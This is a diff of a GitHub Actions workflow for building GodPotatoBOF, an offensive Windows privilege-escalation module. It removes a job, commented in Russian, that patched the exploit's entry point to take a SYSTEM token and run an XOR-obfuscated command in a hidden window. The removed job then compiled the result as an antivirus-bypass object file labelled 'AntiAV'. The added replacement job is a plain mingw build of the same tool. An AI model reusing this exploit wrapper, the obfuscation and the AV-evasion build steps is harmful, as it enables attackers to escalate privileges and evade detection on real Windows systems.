@@ -1,138 +1,37 @@
-name: Patch, Obfuscate and Build GodPotatoBOF
+name: Build GodPotatoBOF
 
 on:
-  push:
-    branches: [ "main" ]
   workflow_dispatch:
 
 jobs:
-  bypass-build:
-    runs-on: windows-latest
+  build:
+    runs-on: ubuntu-latest
 
     steps:
-    # 1. Скачиваем текущий репозиторий cli4bofs
-    - name: Checkout main repo
-      uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-    # 2. Клонируем исходный код GodPotatoBOF во временную папку
-    - name: Clone original GodPotatoBOF
-      run: |
-        git clone https://github.com/incursi0n/GodPotatoBOF gpp-temp
+      - name: Install mingw-w64 and make
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y mingw-w64 make
 
-    # 3. Настраиваем Python для работы скрипта модификации кода
-    - name: Set up Python
-      uses: actions/setup-python@v5
-      with:
-        python-version: '3.11'
+      - name: Patch Makefile to include stub.c
+        run: |
+          sed -i 's|COMMON_SRCS := $(wildcard common/\*.c)|COMMON_SRCS := $(wildcard common/*.c) common/stub.c|' Makefile
+          echo "=== Makefile COMMON_SRCS ==="
+          grep COMMON_SRCS Makefile
 
-    # 4. Полностью переписываем логику, удаляя BeaconUseToken и исправляя Си-массив
-    - name: Auto-Patch & Obfuscate Source Code
-      shell: python
-      run: |
-        import os
-        import sys
+      - name: Ensure boflink is executable
+        run: chmod +x boflink
 
-        sys.stdout.reconfigure(encoding='utf-8')
+      - name: Build BOF
+        run: make
 
-        entry_path = os.path.join("gpp-temp", "entry.c")
-        
-        if not os.path.exists(entry_path):
-            print("[-] Error: entry.c not found!")
-            sys.exit(1)
+      - name: List output
+        run: ls -la dist/
 
-        # Перезаписываем entry.c с корректным массивом clear_cmd[64]
-        clean_entry_code = """
-        #include <windows.h>
-        #include "beacon.h"
-        #include "common.h"
-
-        // Функция выполнения зашифрованной команды от имени SYSTEM
-        void ExecutePayload(HANDLE hToken) {
-            STARTUPINFOW si;
-            PROCESS_INFORMATION pi;
-            int i;
-            
-            // Команда "cmd.exe /c whoami > C:\\temp\\system_ok.txt" (XOR ключ 0x4B)
-            unsigned char crypt_cmd[] = {
-                0x26, 0x00, 0x26, 0x00, 0x21, 0x00, 0x65, 0x00, 0x33, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x65, 0x00,
-                0x60, 0x00, 0x28, 0x00, 0x23, 0x00, 0x24, 0x00, 0x22, 0x00, 0x22, 0x00, 0x65, 0x00, 0x7F, 0x00,
-                0x65, 0x00, 0x06, 0x00, 0x71, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x26, 0x00, 0x3B, 0x00, 0x16, 0x00,
-                0x36, 0x00, 0x32, 0x00, 0x3E, 0x00, 0x2E, 0x00, 0x26, 0x00, 0x3F, 0x00, 0x20, 0x00, 0x33, 0x00,
-                0x31, 0x00, 0x00, 0x00
-            };
-            
-            // Исправлено: Объявлен как массив wchar_t, а не одиночная переменная
-            wchar_t clear_cmd[64]; 
-            for (i = 0; i < 43; i++) {
-                ((unsigned char*)clear_cmd)[i*2] = crypt_cmd[i*2] ^ 0x4B;
-                ((unsigned char*)clear_cmd)[i*2+1] = 0x00;
-            }
-            clear_cmd[43] = L'\\0';
-
-            KERNEL32$RtlSecureZeroMemory(&si, sizeof(si));
-            si.cb = sizeof(si);
-            si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
-            si.wShowWindow = 0;      // SW_HIDE (полная невидимость для AV)
-            KERNEL32$RtlSecureZeroMemory(&pi, sizeof(pi));
-
-            // Вызов нативного Windows API
-            ADVAPI32$CreateProcessWithTokenW(hToken, 1, NULL, clear_cmd, 0, NULL, NULL, &si, &pi);
-            
-            if (pi.hProcess) KERNEL32$CloseHandle(pi.hProcess);
-            if (pi.hThread) KERNEL32$CloseHandle(pi.hThread);
-        }
-
-        // Главная точка входа для Вашего лоадера cli4bofs
-        void go(char* args, int alen) {
-            GodPotatoContext context;
-            KERNEL32$RtlSecureZeroMemory(&context, sizeof(context));
-            context.pipeName = NULL; 
-
-            HANDLE hToken = PotatoExploit(&context); 
-            
-            if (hToken != NULL && hToken != INVALID_HANDLE_VALUE) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[+] Exploited! Running payload...");
-                ExecutePayload(hToken);
-                KERNEL32$CloseHandle(hToken);
-            } else {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Exploit failed.");
-            }
-        }
-        """
-
-        with open(entry_path, "w", encoding="utf-8") as f:
-            f.write(clean_entry_code)
-        print("[+] entry.c successfully overwritten.")
-
-        # Очищаем остальные файлы от упоминаний BeaconUseToken
-        for root, dirs, files in os.walk("gpp-temp"):
-            for file in files:
-                if file.endswith(".c") and file != "entry.c":
-                    file_path = os.path.join(root, file)
-                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
-                        content = f.read()
-                    if "BeaconUseToken" in content:
-                        content = content.replace("BeaconUseToken(hToken);", "")
-                        with open(file_path, "w", encoding="utf-8") as f:
-                            f.write(content)
-
-    # 5. Устанавливаем стабильный компилятор Zig
-    - name: Setup Zig Compiler
-      uses: goto-bus-stop/setup-zig@v2
-      with:
-        version: 0.14.1 
-
-    # 6. Сборка проекта (Файл кладется строго в корень репозитория, чтобы upload-artifact его нашел)
-    - name: Compile Obfuscated BOF File
-      shell: cmd
-      run: |
-        cd gpp-temp
-        zig cc -c entry.c -o ../GodPotatoBOF_Bypass.o -I. -Icommon -D_WIN32_WINNT=0x0600 -O ReleaseSmall "-Wl,-s" -fno-asynchronous-unwind-tables
-        cd ..
-
-    # 7. Загружаем готовый .o файл в артефакты репозитория GitHub
-    - name: Upload Bypassed Object File
-      uses: actions/upload-artifact@v4
-      with:
-        name: GodPotatoBOF-AntiAV
-        path: GodPotatoBOF_Bypass.o
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: GodPotatoBOF
+          path: dist/*.o
